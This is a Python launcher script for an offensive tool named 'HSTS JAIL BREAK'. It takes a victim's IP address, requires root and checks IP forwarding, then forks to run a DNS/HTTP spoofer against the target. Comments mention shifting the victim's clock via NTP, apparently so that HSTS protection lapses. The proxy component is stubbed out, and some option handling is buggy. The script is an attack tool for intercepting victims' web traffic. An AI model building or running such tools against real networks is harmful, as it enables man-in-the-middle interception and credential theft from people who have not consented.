import sys
#sys.stderr = None
import platform
import subprocess
import getopt
import banner
import spoofing.spoofer as spoofer
import os 
from  printing import Printing
from scapy.all import conf
ALLOWED_PLATFORMS = ["Darwin","Linux"]



def main(verbose: bool ):
    '''     
	usage: python3 hstsjailbreak.py <target> [-h,--help] [-s,--silent] [-i=,--iface=] 
                    ⛓️  🦊 HSTS JAIL BREAK 🦊 ⛓️
        mandatory arguments: 
            🧔🏽‍♂️ target - the victim's ip address
	optional arguments:      
	    💁 -h,--help show this help message and exit 
	    🤫 -s,--silent silent or loud mode 
	    📬 -i,--iface IFACE Interface you wish to use       		
	'''
    
    platformOS = platform.system() 
    
    if platformOS  not in ALLOWED_PLATFORMS : 
        Printing.printError("You are using un-supported platform ! ")
        sys.exit(-1)
        
    if os.getuid() != 0 : #check for root premissions
        Printing.printError(""" you are not privileged enough - try using 'sudo python3 ...' or 'su root' """)
        sys.exit(-1)
        
    if platformOS == ALLOWED_PLATFORMS[0]:  # if we on MacOs Machine - ip fowarding 
         if "0" not in subprocess.check_output("sudo sysctl -w net.inet.ip.forwarding", shell=True).decode(encoding='ascii'): 
            Printing.printError("disable ip forwarding")
            sys.exit(-1)
            
    if platformOS == ALLOWED_PLATFORMS[1]:  # if we on Linux Machine - ip forwarding 
        with open("/proc/sys/net/ipv4/ip_forward",'r') as file : 
            if file.read() != "0": 
                Printing.printError("disable ip forwarding with sysctl -w net.ipv4.ip_forward=0 ")
                sys.exit(-1)
            
    if len(sys.argv) < 2  or   "-h" in sys.argv[1:] or "--help" in sys.argv[1:] : 
        print(main.__doc__)
        sys.exit(0)
        
        
    opts, args = getopt.getopt(sys.argv[2:], "i:s:h", [
                                  "iface=","silent","help"])
    
    arguments = {
        "tatget" : sys.argv[1] , 
        "silent": False , 
        "interface" : conf.iface 
    } 
    
    for name , value in opts : 
        if name in ("-i " ,"--interface") :
            arguments["interface"] = value  
        if name in ("-s","--silent" ):
            arguments["silent"] = True 
        if name in ("-h","--help"): 
            print(main.__doc__)
            sys.exit(0)
    try : 
        if not verbose: 
            banner.banner() 
        #ntp postion right here to 1000 days to the future 
        if os.fork() : 
            # dad process - runing the spoofer 
            spoofer.HttpDnsSpoofer(arguments["tatget"],arguments["interface"])
            os.wait()

        
        else : 
            # son process - runing the proxy 
            ...
            #proxy.StartProxy()
    except Exception as e : 
        Printing.printError(e)


if __name__ == "__main__": 
   main(False)
    
   